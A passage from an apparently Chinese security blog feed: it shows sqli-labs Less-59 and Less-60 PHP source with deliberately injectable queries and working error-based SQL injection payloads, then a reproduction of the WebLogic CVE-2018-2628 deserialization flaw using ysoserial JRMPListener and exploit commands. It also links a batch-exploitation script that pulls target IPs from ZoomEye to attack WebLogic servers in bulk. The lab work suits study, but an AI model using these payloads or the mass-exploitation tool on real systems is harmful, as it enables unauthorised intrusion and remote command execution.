class="line"><span class="keyword">if</span>($tryyy &gt;= ($times+<span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line">setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Redirecting you to challenge page..........\n"</span>;</span><br><span class="line">header( <span class="string">"refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#00FFFF"&gt;'</span>;</span><br><span class="line">$unames=<span class="keyword">array</span>(<span class="string">"Dumb"</span>,<span class="string">"Angelina"</span>,<span class="string">"Dummy"</span>,<span class="string">"secure"</span>,<span class="string">"stupid"</span>,<span class="string">"superman"</span>,<span class="string">"batman"</span>,<span class="string">"admin"</span>,<span class="string">"admin1"</span>,<span class="string">"admin2"</span>,<span class="string">"admin3"</span>,<span class="string">"dhakkan"</span>,<span class="string">"admin4"</span>);</span><br><span class="line">$pass = array_reverse($unames);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name : '</span>. $unames[$row[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password : '</span> .$pass[$row[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font color='#00FFFF': size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;('CHALLENGES')&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;"</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/Less-59.jpg"</span> /&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;div  style=<span class="string">" color:#00FFFF; font-size:18px; text-align:center"</span>&gt;</span><br><span class="line">&lt;form name=<span class="string">"input"</span> action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">Submit Secret Key: &lt;input type=<span class="string">"text"</span> name=<span class="string">"key"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name = <span class="string">"answer_key"</span> value=<span class="string">"Submit"</span>&gt;</span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;div  style=" color:#00FFFF; font-size:18px; text-align:center"&gt;'</span>;</span><br><span class="line">$key = addslashes($_POST[<span class="string">'key'</span>]);</span><br><span class="line">$key = mysql_real_escape_string($key);</span><br><span class="line"><span class="comment">//echo $key;</span></span><br><span class="line"><span class="comment">//Query table to verify your result</span></span><br><span class="line">$sql=<span class="string">"SELECT 1 FROM $table WHERE $col1= '$key'"</span>;</span><br><span class="line"><span class="comment">//echo "$sql";</span></span><br><span class="line">$result=mysql_query($sql)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"error in submittion of Key Solution"</span>.mysql_error());</span><br><span class="line"> </span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/Less-54-1.jpg" /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>; </span><br><span class="line">header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap1.jpg" /&gt;'</span>;</span><br><span class="line">header( <span class="string">"refresh:3;url=index.php"</span> );</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>要求如是循环非我不可，这次可尝试注入的次数为6次，根据代码给出payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-59/?id=1%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-59/?id=1%20and%20updatexml(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=%22challenges%22),0x7e),1)</span><br></pre></td></tr></table></figure></p><p>mysql&gt; select <em> from n7geazs8vw where id=1 and updatexml(1,concat(0x7e,(select <code>3</code> from (select 1,2,3,4 union select </em> from n7geazs8vw)a limit 1,1),0x7e),1);<br>ERROR 1105 (HY000): XPATH syntax error: ‘~hjYL3TyRcHgWxt35BVu4srby~’</p><p><b>60关</b><br>代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Less<span class="number">-60</span>:Challenge<span class="number">-7</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style =<span class="string">"text-align:right"</span>&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input  type=<span class="string">"submit"</span> name=<span class="string">"reset"</span> value=<span class="string">"Reset the Challenge!"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/right&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:20px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../sql-connections/sql-connect-1.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../sql-connections/functions.php'</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$pag = $_SERVER[<span class="string">'PHP_SELF'</span>]; <span class="comment">//generating page address to piggy back after redirects...</span></span><br><span class="line">$characters = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>; <span class="comment">//characterset for generating random data</span></span><br><span class="line">$times= <span class="number">5</span>;</span><br><span class="line">$table = table_name();</span><br><span class="line">$col = column_name(<span class="number">1</span>);     <span class="comment">// session id column name</span></span><br><span class="line">$col1 = column_name(<span class="number">2</span>);   <span class="comment">//secret key column name</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Submitting the final answer</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'answer_key'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// resetting the challenge and repopulating the table .</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'reset'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Redirecting you to main challenge page..........\n"</span>;</span><br><span class="line">header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line"><span class="comment">//echo "cookie expired";</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Checking the cookie on the page and populate the table with random value.</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'challenge'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$sessid=$_COOKIE[<span class="string">'challenge'</span>];</span><br><span class="line"><span class="comment">//echo "Cookie value: ".$sessid;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$expire = time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>;</span><br><span class="line">$hash = data($table,$col);</span><br><span class="line">setcookie(<span class="string">"challenge"</span>, $hash, $expire);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//update the counter in database</span></span><br><span class="line">next_tryy();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Display attempts on screen.</span></span><br><span class="line">$tryyy = view_attempts();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"You have made : "</span>. $tryyy .<span class="string">" of $times attempts"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Reset the Database if you exceed allowed attempts.</span></span><br><span class="line"><span class="keyword">if</span>($tryyy &gt;= ($times+<span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line">setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Redirecting you to challenge page..........\n"</span>;</span><br><span class="line">header( <span class="string">"refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$id = <span class="string">'("'</span>.$id.<span class="string">'")'</span>;</span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#00FFFF"&gt;'</span>;</span><br><span class="line">$unames=<span class="keyword">array</span>(<span class="string">"Dumb"</span>,<span class="string">"Angelina"</span>,<span class="string">"Dummy"</span>,<span class="string">"secure"</span>,<span class="string">"stupid"</span>,<span class="string">"superman"</span>,<span class="string">"batman"</span>,<span class="string">"admin"</span>,<span class="string">"admin1"</span>,<span class="string">"admin2"</span>,<span class="string">"admin3"</span>,<span class="string">"dhakkan"</span>,<span class="string">"admin4"</span>);</span><br><span class="line">$pass = array_reverse($unames);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name : '</span>. $unames[$row[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password : '</span> .$pass[$row[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line">print_r(mysql_error());</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font color='#00FFFF': size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;('CHALLENGES')&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;"</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/Less-60.jpg"</span> /&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;div  style=<span class="string">" color:#00FFFF; font-size:18px; text-align:center"</span>&gt;</span><br><span class="line">&lt;form name=<span class="string">"input"</span> action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">Submit Secret Key: &lt;input type=<span class="string">"text"</span> name=<span class="string">"key"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name = <span class="string">"answer_key"</span> value=<span class="string">"Submit"</span>&gt;</span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;div  style=" color:#00FFFF; font-size:18px; text-align:center"&gt;'</span>;</span><br><span class="line">$key = addslashes($_POST[<span class="string">'key'</span>]);</span><br><span class="line">$key = mysql_real_escape_string($key);</span><br><span class="line"><span class="comment">//echo $key;</span></span><br><span class="line"><span class="comment">//Query table to verify your result</span></span><br><span class="line">$sql=<span class="string">"SELECT 1 FROM $table WHERE $col1= '$key'"</span>;</span><br><span class="line"><span class="comment">//echo "$sql";</span></span><br><span class="line">$result=mysql_query($sql)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"error in submittion of Key Solution"</span>.mysql_error());</span><br><span class="line"> </span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/Less-54-1.jpg" /&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>; </span><br><span class="line">header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap1.jpg" /&gt;'</span>;</span><br><span class="line">header( <span class="string">"refresh:3;url=index.php"</span> );</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>滴滴滴，这作者又玩重复的招数<br><img src="https://s2.ax1x.com/2019/02/17/kypnjP.png" alt="kypnjP.png"></p><p>根据代码给出payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-60/?id=1%27%22)%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)%20--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-60/?id=1%27%22)%20and%20updatexml(1,concat(0x7e,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=%22challenges%22),0x7e),1)%20--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-60/?id=1%27%22)%20and%20updatexml(1,concat(0x7e,((select%20`3`%20from%20(select%201,2,3,4%20union%20select%20*%20from%20glepzxoblp)a%20limit%201,1)),0x7e),1)%20--+</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/17/kypdBT.png" alt=""></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Weblogic deserialization vulnerability recurrence (CVE-2018-2628)</title>
      <link href="/posts/5a7054a8.html"/>
      <url>/posts/5a7054a8.html</url>
      <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><hr><p>复现CVE-2018-2628的反序列化漏洞，正好还欠慕慕一个对应的利用脚本。随便就一起搞了，搭建这个靶场可真的是耗费时间= =</p><p><img src="http://5b0988e595225.cdn.sohucs.com/images/20180705/7ce9bee1c06544e8992b78c0a1b29dff.jpg" alt="7ce9bee1c06544e8992b78c0a1b29dff.jpg"></p><p><b>BGM 方圆几里:</b><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=27955658&auto=1&height=66"></iframe></p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><hr><p>首先去vulhub下好对应的项目，进入对应的文件夹，执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p><p>搭建好环境后，访问：127.0.0.1:7001<br>出现以下：<br><img src="https://s2.ax1x.com/2019/02/16/ksQKVH.png" alt="ksQKVH.png"></p><p><b>漏洞介绍</b></p><blockquote><p>Oracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。</p></blockquote><p><b>漏洞复现</b><br>下载对应的利用工具：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</span><br><span class="line">copy里面的利用代码https://www.exploit-db.com/exploits/44553</span><br></pre></td></tr></table></figure></p><p>利用：<br>启动一个JRMP Server：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]</span><br><span class="line"></span><br><span class="line">listen port=监听的端口</span><br><span class="line">command=你要执行的命令</span><br><span class="line"></span><br><span class="line">例子：java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1001 CommonsCollections1 &apos;touch /haq520&apos;</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/16/kstj2j.png" alt="kstj2j.png"></p><p>发送exploit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">python exp.py 127.0.0.1 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 127.0.0.1 1099 JRMPClient</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/16/ksNMdK.md.png" alt=""></p><p>结果：<br><img src="https://s2.ax1x.com/2019/02/16/ksNaeP.png" alt="ksNaeP.png"> </p><p><b>实战</b><br>上面说了欠慕慕一个脚本，这里下午写完。放入了仓库<br><a href="https://github.com/422926799/python/tree/master/weblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%B9%E9%87%8F%E5%88%A9%E7%94%A8" target="_blank" rel="noopener">python/weblogic反序列化批量利用 at master · 422926799/python · GitHub</a></p><p>说明：<br>weblogic反序列化批量利用，可通过网页关键字判断是否weblogic服务，批量检测或单个检测，判断7001端口是否开放,可从zoomeye抓取IP，请自行配置config文件夹里面的search.ini，填写zoomeye的user和pwd。</p><p>测试结果：<br><img 